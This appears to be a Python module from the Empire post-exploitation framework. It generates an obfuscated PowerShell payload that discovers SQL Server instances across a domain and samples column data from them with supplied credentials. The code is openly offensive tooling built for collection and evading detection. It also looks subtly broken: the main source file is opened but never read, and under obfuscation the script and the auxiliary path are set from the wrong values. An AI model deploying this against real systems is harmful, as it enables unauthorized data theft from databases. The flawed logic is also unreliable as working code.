from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        username = params['Username']
        password = params['Password']
        instance = params['Instance']
        no_defaults = params['NoDefaults']
        check_all = params['CheckAll']
        script_end = ""
        
        # read in the common module source code
        module_source = main_menu.installPath + "data/module_source/collection/Get-SQLColumnSampleData.ps1"
        script = ""
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            script = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        if check_all:
            aux_module_source = main_menu.installPath + "data/module_source/situational_awareness/network/Get-SQLInstanceDomain.ps1"
            if obfuscate:
                helpers.obfuscate_module(moduleSource=aux_module_source, obfuscationCommand=obfuscation_command)
                aux_module_source = module_source.replace("module_source", "obfuscated_module_source")
            try:
                with open(aux_module_source, 'r') as auxSource:
                    auxScript = auxSource.read()
                    script += " " + auxScript
            except:
                print(helpers.color("[!] Could not read additional module source path at: " + str(aux_module_source)))
            script_end = " Get-SQLInstanceDomain "
            if username != "":
                script_end += " -Username "+username
            if password != "":
                script_end += " -Password "+password
            script_end += " | "
        script_end += " Get-SQLColumnSampleData"
        if username != "":
            script_end += " -Username "+username
        if password != "":
            script_end += " -Password "+password
        if instance != "" and not check_all:
            script_end += " -Instance "+instance
        if no_defaults:
            script_end += " -NoDefaults "

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
